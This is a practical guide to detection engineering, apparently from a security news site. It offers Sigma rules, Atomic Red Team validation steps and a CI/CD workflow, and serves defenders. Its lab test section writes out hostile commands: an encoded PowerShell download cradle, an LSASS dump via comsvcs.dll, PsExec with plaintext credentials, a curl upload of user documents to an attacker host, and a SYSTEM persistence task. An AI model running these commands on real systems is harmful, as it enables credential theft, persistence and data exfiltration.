# Detection Engineering: A Practical Guide

## What Is Detection Engineering?

Detection engineering is the practice of designing, building, testing, and maintaining logic that identifies malicious activity in your environment. It treats detections the same way software engineering treats code: version-controlled, tested, reviewed, deployed through pipelines, and retired when they stop being useful.

Traditional security operations relied on vendor-provided rules and signature updates. Detection engineering flips that model. Instead of waiting for a vendor to ship a rule, your team writes detections tailored to your environment, your threat model, and your telemetry. You own the logic. You maintain it. You measure whether it actually works.

This matters because attackers do not follow a script. Off-the-shelf rules catch commodity threats, but targeted intrusions require custom detection logic. If your blue team cannot write and deploy a new detection within hours of learning about a technique, you are always playing catch-up.

Detection engineering also reduces alert fatigue. A well-tuned detection fires when it should and stays quiet when it should not. That means analysts trust their alerts, investigate faster, and escalate the right things.

---

## The Detection Development Lifecycle

Every detection follows a lifecycle. Skipping steps leads to rules that either miss real threats or drown your team in false positives.

### 1. Hypothesis

Start with a question: "What would it look like if an attacker did X in our environment?" The hypothesis comes from threat intelligence, incident reports, red team findings, or MITRE ATT&CK research.

Example hypothesis: "An attacker who gains initial access to a workstation will attempt to dump credentials from LSASS memory using Mimikatz or a similar tool. This would generate a process access event targeting lsass.exe with specific access rights."

### 2. Write

Translate the hypothesis into a detection rule. Use a vendor-agnostic format like Sigma so the rule can be converted to whatever SIEM or EDR you run. Define the log source, the conditions, and the metadata.

### 3. Test

Validate the rule against known-bad activity. Use tools like Atomic Red Team to simulate the technique in a lab. Confirm the rule fires. Then run it against a sample of production logs to estimate false positive volume.

### 4. Deploy

Push the rule to your detection platform. Start in a logging-only or low-severity mode so you can observe its behavior without generating actionable alerts immediately.

### 5. Tune

Review the first week of hits. Whitelist known-good processes, narrow overly broad conditions, and adjust thresholds. This step never truly ends. Every environment changes over time.

### 6. Retire

When a detection no longer provides value (the technique is obsolete, the telemetry source is gone, or a better rule replaced it), retire it. Remove it from production and archive it in your repository with a note explaining why.

---

## Writing Sigma Rules from Scratch

Sigma is a generic signature format for SIEM systems. You write a rule once in YAML, then convert it to your platform's query language using tools like `sigma-cli` or `pySigma`.

### Sigma Rule Structure

Every Sigma rule has these sections:

```
title:          Short name for the rule
id:             UUID for tracking
status:         test | experimental | stable | deprecated
description:    What this rule detects and why it matters
references:     Links to threat intel, blog posts, or ATT&CK techniques
author:         Who wrote it
date:           When it was created
modified:       When it was last updated
tags:           MITRE ATT&CK tags
logsource:      What log data the rule applies to
detection:      The actual matching logic
falsepositives: Known benign scenarios that could trigger the rule
level:          informational | low | medium | high | critical
```

The `detection` section uses `selection` blocks (what to match) and `condition` statements (how to combine them). You can use `filter` blocks to exclude known-good activity.

### Rule 1: Detecting Suspicious PowerShell Execution

PowerShell is one of the most abused living-off-the-land binaries. Attackers use encoded commands, download cradles, and execution policy bypasses to run malicious scripts without dropping files to disk.

```yaml
title: Suspicious PowerShell Command Line Arguments
id: 6f67461c-a47f-4c78-9ce5-5a72e4a10c72
status: stable
description: |
    Detects PowerShell execution with command line arguments commonly
    used by attackers, including encoded commands, download cradles,
    and execution policy bypasses. These patterns are rare in normal
    administrative usage and often indicate malicious activity.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_binary:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_encoded:
        CommandLine|contains:
            - '-encodedcommand'
            - '-enc '
            - '-ec '
            - '-enco '
    selection_download:
        CommandLine|contains:
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Invoke-WebRequest'
            - 'iwr '
            - 'wget '
            - 'curl '
            - 'Start-BitsTransfer'
    selection_bypass:
        CommandLine|contains:
            - '-ExecutionPolicy Bypass'
            - '-ep bypass'
            - '-exec bypass'
            - 'Set-ExecutionPolicy Unrestricted'
    selection_hidden:
        CommandLine|contains:
            - '-WindowStyle Hidden'
            - '-w hidden'
            - '-w 1'
            - '-nop'
            - '-noni'
    condition: selection_binary and (selection_encoded or selection_download or selection_bypass or selection_hidden)
falsepositives:
    - Legitimate administrative scripts that use encoded commands
    - Software deployment tools like SCCM or Intune
    - Chocolatey package manager installations
level: medium
```

### Rule 2: Detecting Credential Dumping via LSASS Access

LSASS (Local Security Authority Subsystem Service) stores credentials in memory. Attackers target it with tools like Mimikatz, ProcDump, and comsvcs.dll MiniDump to extract passwords and hashes.

```yaml
title: LSASS Memory Access for Credential Dumping
id: 8e4b3a1d-5c7f-4e2a-9b6d-3f1c8a5e7d90
status: stable
description: |
    Detects processes accessing LSASS memory with access rights
    commonly associated with credential dumping. This covers
    Mimikatz, ProcDump, comsvcs MiniDump, and custom dumping tools
    that read LSASS process memory.
references:
    - https://attack.mitre.org/techniques/T1003/001/
    - https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'
            - '0x1038'
            - '0x1438'
            - '0x143a'
            - '0x1fffff'
    filter_system:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
        SourceImage|endswith:
            - '\csrss.exe'
            - '\lsm.exe'
            - '\wmiprvse.exe'
            - '\svchost.exe'
    filter_av:
        SourceImage|contains:
            - '\MsMpEng.exe'
            - '\CrowdStrike\'
            - '\SentinelOne\'
            - '\Carbon Black\'
    filter_msi:
        SourceImage|endswith: '\msiexec.exe'
    condition: selection and not (filter_system or filter_av or filter_msi)
falsepositives:
    - Antivirus or EDR products not listed in the filter
    - Windows Error Reporting (WerFault.exe)
    - Legitimate debugging tools used by developers
level: high
```

### Rule 3: Detecting Lateral Movement via PsExec

PsExec is a Sysinternals tool that lets you execute processes on remote systems. Attackers use it (or clones like PAExec and RemCom) for lateral movement after compromising credentials.

```yaml
title: PsExec Lateral Movement Detection
id: a2d4f6e8-1b3c-5d7e-9f0a-2c4e6b8d0f12
status: stable
description: |
    Detects PsExec and PsExec-like tool execution by monitoring for
    the installation of the PSEXESVC service and the creation of
    named pipes associated with PsExec. Also detects common PsExec
    clones like PAExec and RemCom.
references:
    - https://attack.mitre.org/techniques/T1021/002/
    - https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/PsExec.htm
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.lateral_movement
    - attack.t1021.002
    - attack.execution
    - attack.t1569.002
logsource:
    category: process_creation
    product: windows
detection:
    selection_service_install:
        Image|endswith:
            - '\PSEXESVC.exe'
            - '\PAExec.exe'
            - '\RemComSvc.exe'
            - '\csexec.exe'
    selection_psexec_args:
        Image|endswith:
            - '\psexec.exe'
            - '\psexec64.exe'
            - '\paexec.exe'
        CommandLine|contains:
            - '\\\\'
    selection_pipe_creation:
        CommandLine|contains:
            - '\pipe\psexesvc'
            - '\pipe\paexecsvc'
            - '\pipe\remcom'
    condition: selection_service_install or selection_psexec_args or selection_pipe_creation
falsepositives:
    - Legitimate system administrators using PsExec for remote management
    - Software deployment tools that leverage PsExec internally
level: high
---

title: PsExec Named Pipe Detection
id: b3e5f7a9-2c4d-6e8f-0a1b-3d5f7c9e1b23
status: stable
description: |
    Detects the creation of named pipes associated with PsExec
    and PsExec-like tools. Named pipe creation on the target
    host is a reliable indicator of PsExec-based lateral movement.
references:
    - https://attack.mitre.org/techniques/T1021/002/
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.lateral_movement
    - attack.t1021.002
logsource:
    category: pipe_created
    product: windows
detection:
    selection:
        PipeName|contains:
            - '\PSExecSvc'
            - '\PAExecSvc'
            - '\RemCom_communicaton'
            - '\csexecsvc'
    condition: selection
falsepositives:
    - Legitimate PsExec usage by authorized administrators
level: high
```

### Rule 4: Detecting Data Exfiltration Indicators

Data exfiltration can take many forms. This rule focuses on detecting large outbound transfers and the use of common exfiltration utilities.

```yaml
title: Potential Data Exfiltration via Command Line Tools
id: c4f6a8b0-3d5e-7f9a-1b2c-4e6f8a0c2d34
status: stable
description: |
    Detects the use of command line tools commonly used for data
    exfiltration, including cloud storage CLI tools, archive creation
    followed by transfer, and the use of DNS or HTTPS tunneling
    utilities. These tools are legitimate on their own but suspicious
    when used in combination with staging behaviors.
references:
    - https://attack.mitre.org/techniques/T1041/
    - https://attack.mitre.org/techniques/T1567/
    - https://attack.mitre.org/techniques/T1048/
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.exfiltration
    - attack.t1041
    - attack.t1567
    - attack.t1048
logsource:
    category: process_creation
    product: windows
detection:
    selection_archive_and_upload:
        CommandLine|contains:
            - '7z.exe a'
            - 'rar.exe a'
            - 'zip '
            - 'tar -cf'
            - 'tar -czf'
            - 'Compress-Archive'
    selection_cloud_cli:
        Image|endswith:
            - '\rclone.exe'
            - '\megacmd.exe'
            - '\gsutil.exe'
        CommandLine|contains:
            - 'copy'
            - 'sync'
            - 'move'
            - 'put'
    selection_exfil_tools:
        Image|endswith:
            - '\curl.exe'
            - '\wget.exe'
        CommandLine|contains:
            - '--upload-file'
            - '-T '
            - '--data @'
            - '-d @'
            - '--post-file'
    selection_dns_tunnel:
        Image|endswith:
            - '\dnscat2.exe'
            - '\iodine.exe'
            - '\dns2tcp.exe'
    condition: selection_archive_and_upload or selection_cloud_cli or selection_exfil_tools or selection_dns_tunnel
falsepositives:
    - Backup software using rclone for legitimate cloud backups
    - Developers using curl to upload build artifacts
    - System administrators creating archives for migration
level: medium
```

### Rule 5: Detecting Persistence via Scheduled Tasks

Attackers create scheduled tasks to maintain access after a reboot. This detection covers both `schtasks.exe` command line creation and direct Task Scheduler event log entries.

```yaml
title: Suspicious Scheduled Task Creation for Persistence
id: d5a7b9c1-4e6f-8a0b-2c3d-5f7a9b1d3e45
status: stable
description: |
    Detects scheduled task creation that may indicate persistence.
    Focuses on tasks created via schtasks.exe with characteristics
    common in malware persistence, including tasks that run at logon
    or startup, tasks pointing to unusual binary locations, and tasks
    created with SYSTEM privileges.
references:
    - https://attack.mitre.org/techniques/T1053/005/
    - https://docs.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-start-page
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.persistence
    - attack.t1053.005
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_schtasks:
        Image|endswith: '\schtasks.exe'
        CommandLine|contains: '/create'
    selection_suspicious_path:
        CommandLine|contains:
            - '\AppData\Local\Temp\'
            - '\AppData\Roaming\'
            - '\Users\Public\'
            - '\ProgramData\'
            - '\Windows\Temp\'
            - '%TEMP%'
            - '%APPDATA%'
    selection_high_priv:
        CommandLine|contains:
            - '/ru SYSTEM'
            - '/ru "SYSTEM"'
            - '/ru NT AUTHORITY\SYSTEM'
    selection_startup_trigger:
        CommandLine|contains:
            - '/sc onlogon'
            - '/sc onstart'
            - '/sc onidle'
    filter_known_good:
        CommandLine|contains:
            - '\Microsoft\Windows\Defrag\'
            - '\Microsoft\Windows\Maintenance\'
            - '\Microsoft\Windows\WindowsUpdate\'
            - 'GoogleUpdate'
    condition: selection_schtasks and (selection_suspicious_path or selection_high_priv or selection_startup_trigger) and not filter_known_good
falsepositives:
    - Legitimate software installations that create scheduled tasks
    - System administrators deploying tasks via scripts
    - GPO-deployed scheduled tasks
level: high
```

### Rule 6: Detecting Windows Event Log Clearing

Attackers clear event logs to hide their tracks. This is almost never done by legitimate users and is a strong indicator of post-compromise activity.

```yaml
title: Windows Event Log Cleared
id: e6b8c0d2-5f7a-9b1c-3d4e-6a8c0e2f4a56
status: stable
description: |
    Detects clearing of Windows event logs using wevtutil, PowerShell
    Clear-EventLog, or the Event Log service recording a log clear
    event. Log clearing is a common anti-forensics technique used by
    attackers to remove evidence of their activity.
references:
    - https://attack.mitre.org/techniques/T1070/001/
author: Detection Engineering Team
date: 2026/04/10
tags:
    - attack.defense_evasion
    - attack.t1070.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_wevtutil:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - 'clear-log'
            - 'cl '
    selection_powershell:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - 'Clear-EventLog'
            - 'Remove-EventLog'
            - '[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog'
    condition: selection_wevtutil or selection_powershell
falsepositives:
    - Legitimate log rotation scripts (rare on Windows)
    - System administrators troubleshooting event log issues
level: high
```

---

## Testing Detections with Atomic Red Team

Writing a detection without testing it is like writing code without running it. Atomic Red Team is an open-source library of small, focused tests mapped to MITRE ATT&CK techniques. Each test simulates a specific attacker behavior so you can verify your detections fire correctly.

### Installing Atomic Red Team

Install the PowerShell execution framework and the test library:

```powershell
# Install the Invoke-AtomicRedTeam module
Install-Module -Name invoke-atomicredteam -Scope CurrentUser -Force

# Import the module
Import-Module invoke-atomicredteam

# Download the atomic test definitions
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics -Force
```

On Linux or macOS, you can clone the repository directly:

```bash
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
```

### How Atomic Tests Map to Sigma Rules

Each Atomic Red Team test is tagged with a MITRE ATT&CK technique ID. Your Sigma rules should also be tagged with the same IDs. This creates a direct mapping:

| Sigma Rule | ATT&CK Technique | Atomic Test |
|---|---|---|
| Suspicious PowerShell | T1059.001 | T1059.001 (multiple tests) |
| LSASS Credential Dump | T1003.001 | T1003.001 (multiple tests) |
| PsExec Lateral Movement | T1021.002 | T1021.002 (multiple tests) |
| Data Exfiltration | T1041 | T1041 (multiple tests) |
| Scheduled Task Persistence | T1053.005 | T1053.005 (multiple tests) |

### Test Commands for Each Detection

**Test 1: Suspicious PowerShell Execution (T1059.001)**

```powershell
# List available tests for this technique
Invoke-AtomicTest T1059.001 -ShowDetailsBrief

# Run test: Mimikatz download cradle
Invoke-AtomicTest T1059.001 -TestNumbers 1

# Run test: Encoded command execution
Invoke-AtomicTest T1059.001 -TestNumbers 3

# Run specific test: PowerShell download and execute
powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQBuAG8AaQBnAC4AYwBvAG0AJwApAA==

# Clean up after tests
Invoke-AtomicTest T1059.001 -TestNumbers 1 -Cleanup
```

**Test 2: LSASS Credential Dumping (T1003.001)**

```powershell
# List available LSASS dump tests
Invoke-AtomicTest T1003.001 -ShowDetailsBrief

# Run test: Dump LSASS with comsvcs.dll MiniDump
Invoke-AtomicTest T1003.001 -TestNumbers 2

# Run test: Dump LSASS with ProcDump
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Manual comsvcs.dll dump (for validation in a lab)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full

# Clean up
Invoke-AtomicTest T1003.001 -TestNumbers 1,2 -Cleanup
```

**Test 3: PsExec Lateral Movement (T1021.002)**

```powershell
# List PsExec tests
Invoke-AtomicTest T1021.002 -ShowDetailsBrief

# Run test: PsExec to remote host (requires target hostname)
Invoke-AtomicTest T1021.002 -TestNumbers 1 -InputArgs @{"remote_host"="target-pc"; "user_name"="domain\admin"; "password"="P@ssw0rd"}

# Manual PsExec execution (lab only)
psexec.exe \\target-pc -u domain\admin -p P@ssw0rd -s cmd.exe

# Clean up
Invoke-AtomicTest T1021.002 -TestNumbers 1 -Cleanup
```

**Test 4: Data Exfiltration (T1041)**

```powershell
# List exfiltration tests
Invoke-AtomicTest T1041 -ShowDetailsBrief

# Run test: Exfiltration over HTTP
Invoke-AtomicTest T1041 -TestNumbers 1

# Manual test: Archive and upload (lab only)
Compress-Archive -Path C:\Users\victim\Documents -DestinationPath C:\temp\exfil.zip
curl.exe --upload-file C:\temp\exfil.zip http://attacker-server.example.com/upload

# Test rclone exfiltration (T1567.002)
Invoke-AtomicTest T1567.002 -ShowDetailsBrief
Invoke-AtomicTest T1567.002 -TestNumbers 1

# Clean up
Invoke-AtomicTest T1041 -TestNumbers 1 -Cleanup
```

**Test 5: Scheduled Task Persistence (T1053.005)**

```powershell
# List scheduled task tests
Invoke-AtomicTest T1053.005 -ShowDetailsBrief

# Run test: Create scheduled task for persistence
Invoke-AtomicTest T1053.005 -TestNumbers 1

# Manual test: Create a suspicious scheduled task (lab only)
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru SYSTEM /f

# Verify the task was created
schtasks /query /tn "WindowsUpdate" /v /fo LIST

# Clean up
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
schtasks /delete /tn "WindowsUpdate" /f
```

### Validating Detection Results

After running each test, verify your detection fired:

```powershell
# Check if Sysmon logged the expected events (PowerShell example)
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {
    $_.Id -eq 1 -and $_.Message -match "powershell.*-enc"
} | Select-Object -First 5 | Format-List TimeCreated, Message

# Check Security event log for process creation (Event ID 4688)
Get-WinEvent -LogName "Security" | Where-Object {
    $_.Id -eq 4688 -and $_.Message -match "schtasks.*create"
} | Select-Object -First 5 | Format-List TimeCreated, Message
```

---

## Detection-as-Code Workflow

Detection-as-code means applying software engineering practices to your detection rules. Rules live in a Git repository. Changes go through pull requests. Deployment happens through CI/CD pipelines.

### Repository Structure

Organize your detection repository like this:

```
detection-rules/
    README.md
    sigma/
        credential_access/
            lsass_memory_access.yml
            credential_dumping_ntds.yml
        execution/
            suspicious_powershell.yml
            malicious_macro_execution.yml
        lateral_movement/
            psexec_detection.yml
            wmi_lateral_movement.yml
        persistence/
            scheduled_task_creation.yml
            registry_run_key.yml
        exfiltration/
            data_exfil_cli_tools.yml
            dns_tunneling.yml
        defense_evasion/
            event_log_clearing.yml
    tests/
        test_powershell_rule.py
        test_lsass_rule.py
    pipelines/
        splunk_pipeline.yml
        elastic_pipeline.yml
    scripts/
        convert_rules.sh
        validate_rules.py
        coverage_report.py
    .github/
        workflows/
            validate.yml
            deploy.yml
```

### CI/CD Pipeline for Detection Deployment

Use GitHub Actions (or any CI system) to validate and deploy rules automatically.

**.github/workflows/validate.yml:**

```yaml
name: Validate Sigma Rules

on:
  pull_request:
    paths:
      - 'sigma/**'

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install sigma-cli
        run: |
          pip install sigma-cli pySigma-backend-splunk pySigma-backend-elasticsearch

      - name: Validate all Sigma rules
        run: |
          sigma check sigma/

      - name: Test Splunk conversion
        run: |
          for rule in sigma/**/*.yml; do
            echo "Converting: $rule"
            sigma convert -t splunk -p sysmon "$rule"
          done

      - name: Test Elasticsearch conversion
        run: |
          for rule in sigma/**/*.yml; do
            echo "Converting: $rule"
            sigma convert -t elasticsearch -p ecs_windows "$rule"
          done
```

**.github/workflows/deploy.yml:**

```yaml
name: Deploy Detections

on:
  push:
    branches:
      - main
    paths:
      - 'sigma/**'

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 2

      - name: Identify changed rules
        id: changed
        run: |
          CHANGED=$(git diff --name-only HEAD~1 HEAD -- sigma/ | tr '\n' ' ')
          echo "files=$CHANGED" >> $GITHUB_OUTPUT

      - name: Install sigma-cli
        run: pip install sigma-cli pySigma-backend-splunk

      - name: Convert and deploy changed rules
        env:
          SPLUNK_TOKEN: ${{ secrets.SPLUNK_API_TOKEN }}
          SPLUNK_URL: ${{ secrets.SPLUNK_URL }}
        run: |
          for rule in ${{ steps.changed.outputs.files }}; do
            echo "Deploying: $rule"
            QUERY=$(sigma convert -t splunk -p sysmon "$rule")
            TITLE=$(grep '^title:' "$rule" | sed 's/title: //')

            curl -k -X POST "$SPLUNK_URL/servicesNS/admin/search/saved/searches" \
              -H "Authorization: Bearer $SPLUNK_TOKEN" \
              -d "name=$TITLE" \
              -d "search=$QUERY" \
              -d "is_scheduled=1" \
              -d "cron_schedule=*/5 * * * *" \
              -d "alert_type=number of events" \
              -d "alert_comparator=greater than" \
              -d "alert_threshold=0"
          done
```

### Converting Rules with sigma-cli

```bash
# Install sigma-cli and backends
pip install sigma-cli pySigma-backend-splunk pySigma-backend-elasticsearch

# Convert a single rule to Splunk SPL
sigma convert -t splunk -p sysmon sigma/execution/suspicious_powershell.yml

# Convert a single rule to Elasticsearch/Lucene
sigma convert -t elasticsearch -p ecs_windows sigma/credential_access/lsass_memory_access.yml

# Convert all rules in a directory
sigma convert -t splunk -p sysmon sigma/

# Validate rules without converting
sigma check sigma/execution/suspicious_powershell.yml
```

### Rule Versioning and Retirement

Track rule status in the YAML itself:

```yaml
# Active rule
status: stable

# Rule being tested
status: test

# Rule being evaluated
status: experimental

# Rule no longer in use
status: deprecated
```

When retiring a rule, update its status and add a note:

```yaml
status: deprecated
description: |
    RETIRED 2026-04-10: Replaced by rule e6b8c0d2 which covers
    additional evasion techniques. Original rule only detected
    wevtutil-based log clearing.
```

Keep deprecated rules in the repository for historical reference. Use Git tags to mark detection pack releases:

```bash
# Tag a release of your detection pack
git tag -a v2026.04.1 -m "April 2026 detection pack: 5 new rules, 3 tuned, 1 retired"
git push origin v2026.04.1

# List all releases
git tag -l "v*"
```

---

## Measuring Detection Coverage

You cannot improve what you do not measure. Detection coverage measurement tells you which techniques you can detect, which ones you cannot, and where to invest next.

### MITRE ATT&CK Coverage Mapping

Map every Sigma rule to its ATT&CK technique using the `tags` field. Then generate a coverage report:

```python
#!/usr/bin/env python3
"""Generate MITRE ATT&CK coverage report from Sigma rules."""

import os
import yaml
import json
from collections import defaultdict

def parse_sigma_rules(rules_dir):
    """Parse all Sigma rules and extract ATT&CK tags."""
    coverage = defaultdict(list)

    for root, dirs, files in os.walk(rules_dir):
        for filename in files:
            if not filename.endswith('.yml'):
                continue

            filepath = os.path.join(root, filename)
            with open(filepath, 'r') as f:
                try:
                    rule = yaml.safe_load(f)
                except yaml.YAMLError:
                    continue

            if not rule or rule.get('status') == 'deprecated':
                continue

            tags = rule.get('tags', [])
            for tag in tags:
                if tag.startswith('attack.t'):
                    technique = tag.replace('attack.', '').upper()
                    coverage[technique].append({
                        'title': rule.get('title', 'Unknown'),
                        'id': rule.get('id', 'Unknown'),
                        'level': rule.get('level', 'unknown'),
                        'status': rule.get('status', 'unknown'),
                        'file': filepath,
                    })

    return coverage


def generate_report(coverage):
    """Print a coverage summary."""
    print(f"Total techniques covered: {len(coverage)}")
    print(f"Total detection rules: {sum(len(v) for v in coverage.values())}")
    print()

    for technique in sorted(coverage.keys()):
        rules = coverage[technique]
        print(f"{technique}: {len(rules)} rule(s)")
        for rule in rules:
            print(f"  - [{rule['level']}] {rule['title']} ({rule['status']})")
    print()

    # Export for ATT&CK Navigator
    navigator_layer = {
        "name": "Detection Coverage",
        "versions": {"attack": "14", "navigator": "4.9", "layer": "4.5"},
        "domain": "enterprise-attack",
        "techniques": [
            {
                "techniqueID": tid.replace('.', '/'),
                "score": len(rules),
                "comment": ", ".join(r['title'] for r in rules),
            }
            for tid, rules in coverage.items()
        ],
    }

    with open('coverage_layer.json', 'w') as f:
        json.dump(navigator_layer, f, indent=2)
    print("ATT&CK Navigator layer exported to coverage_layer.json")


if __name__ == '__main__':
    coverage = parse_sigma_rules('sigma/')
    generate_report(coverage)
```

Run the coverage report:

```bash
python scripts/coverage_report.py
```

Import the generated `coverage_layer.json` into the [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) to visualize which techniques you cover and where gaps exist.

### Key Metrics

Track these metrics over time to measure your detection program's effectiveness:

**Mean Time to Detect (MTTD):** The average time between an attack occurring and a detection rule firing. Measure this during red team exercises and incident reviews.

```
MTTD = (time_alert_fired - time_attack_started) averaged across incidents
```

**False Positive Rate:** The percentage of alerts that turn out to be benign. Track per rule.

```
FP Rate = (false_positive_alerts / total_alerts) * 100
```

Target: under 10% per rule. If a rule exceeds 20%, it needs tuning or retirement.

**Detection Coverage Percentage:** The fraction of ATT&CK techniques relevant to your threat model that have at least one detection.

```
Coverage = (techniques_with_detections / techniques_in_threat_model) * 100
```

**Rule Health:** Track how many rules are actively firing, how many have never fired (potentially broken), and how many fire too often (potential noise).

```bash
# Example: Query Splunk for rule firing frequency over 30 days
| rest /servicesNS/-/-/saved/searches
| search is_scheduled=1 alert.track=1
| join title [
    | search index=_audit action=alert_fired
    | stats count as fire_count by savedsearch_name
    | rename savedsearch_name as title
  ]
| table title, fire_count
| sort - fire_count
```

---

## Common Pitfalls

### 1. Writing Rules That Are Too Broad (Alert Fatigue)

A rule that fires hundreds of times a day becomes background noise. Analysts stop investigating it, and real attacks hide in the volume.

**Bad example:**

```yaml
# This will fire on every PowerShell execution in the environment
detection:
    selection:
        Image|endswith: '\powershell.exe'
    condition: selection
```

**Better approach:** Add conditions that narrow the scope to genuinely suspicious behavior. Combine multiple indicators. Use filters to exclude known-good activity.

The cost of a noisy rule is not just the false positive alerts. It is the real positive that gets ignored because the analyst has been conditioned to dismiss that alert type.

### 2. Writing Rules That Are Too Specific (Easily Bypassed)

A rule that detects exactly one tool with exactly one command line argument is trivially defeated by an attacker who renames the binary or changes a flag.

**Bad example:**

```yaml
# Only detects Mimikatz with this exact command
detection:
    selection:
        CommandLine: 'mimikatz.exe "privilege::debug" "sekurlsa::logpasswords"'
    condition: selection
```

**Better approach:** Detect the behavior, not the tool. In this case, detect the LSASS access pattern (as shown in Rule 2 above) rather than the specific binary name. Attackers rename tools. They rarely change the underlying API calls.

Build detections in layers. Have a specific rule for the known tool AND a behavioral rule for the technique. The specific rule catches commodity threats quickly. The behavioral rule catches customized attacks.

### 3. Not Tuning After Deployment

Deploying a rule and walking away is a recipe for either alert fatigue or missed detections. Environments change constantly. New software gets installed. IT teams adopt new tools. What was suspicious last month might be normal this month.

**Tuning process:**

1. Deploy the rule in logging-only mode for one week
2. Review every hit manually
3. Identify patterns in false positives
4. Add filters for verified benign activity
5. Promote the rule to alerting mode
6. Review again after 30 days
7. Schedule quarterly reviews for all production rules

Keep a tuning log in your repository:

```yaml
# tuning_log.yml
- rule_id: 6f67461c-a47f-4c78-9ce5-5a72e4a10c72
  date: 2026-04-15
  action: Added filter for SCCM client PowerShell activity
  reason: 200+ false positives per day from legitimate software deployment
  analyst: jsmith

- rule_id: 6f67461c-a47f-4c78-9ce5-5a72e4a10c72
  date: 2026-05-01
  action: Removed curl from download detection on servers
  reason: Monitoring servers use curl for health checks every 30 seconds
  analyst: jdoe
```

### 4. Testing Only Against Known-Bad, Not Real-World Noise

Your rule fires perfectly against Atomic Red Team tests in a clean lab. Great. But will it also fire 500 times a day in production because of a legitimate tool you did not account for?

**Always test both ways:**

- **Known-bad testing:** Run Atomic Red Team tests to confirm the rule detects the technique. This validates your true positive rate.
- **Noise testing:** Run the rule against a representative sample of production logs (one week minimum) to estimate the false positive volume. This validates your operational readiness.

A rule that catches every attack but generates 1,000 false positives per day is worse than useless. It actively harms your security program by consuming analyst time and building distrust in your alerting pipeline.

### 5. Ignoring Log Source Availability

You cannot detect what you cannot see. Before writing a rule, verify that the required log source actually exists in your environment and that the relevant fields are being collected.

**Checklist before writing any rule:**

```
[ ] Is Sysmon installed and configured to log this event type?
[ ] Is Windows Event Logging configured for the required audit category?
[ ] Are the logs being forwarded to the SIEM?
[ ] Is the log retention sufficient to catch slow-moving attacks?
[ ] Are the required fields being parsed and indexed?
```

Common gaps:
- Process creation events (Event ID 4688) require "Audit Process Creation" to be enabled
- Command line logging requires an additional GPO setting
- Sysmon provides richer data than native Windows logging but must be deployed and configured
- PowerShell script block logging (Event ID 4104) must be explicitly enabled
- DNS query logging requires Sysmon or DNS server audit configuration

### 6. No Documentation or Context

A Sigma rule without context is just a YAML file. Future team members (and future you) need to understand the threat model, the expected false positive patterns, and the tuning history.

Every rule should include:
- A clear description explaining what it detects and why it matters
- References to threat intelligence or incident reports that motivated the rule
- Documented false positive scenarios
- A severity level that reflects actual risk, not theoretical impact

---

## Putting It All Together

Detection engineering is not a one-time project. It is an ongoing practice. Start small. Pick the five techniques most relevant to your threat model. Write rules. Test them. Deploy them. Tune them. Then expand.

The workflow looks like this:

1. Review threat intelligence and identify a technique to detect
2. Verify you have the required log sources
3. Write a Sigma rule and commit it to your repository
4. Open a pull request for peer review
5. Run automated validation in CI
6. Test with Atomic Red Team in a lab
7. Deploy to your SIEM in logging-only mode
8. Tune against production noise for one week
9. Promote to alerting mode
10. Measure effectiveness and schedule regular reviews

The best detection engineering teams treat their rule repository like a product. It has a roadmap. It has quality standards. It has metrics. And it gets better every sprint.

---

From [AllSecurityNews.com](https://allsecuritynews.com)
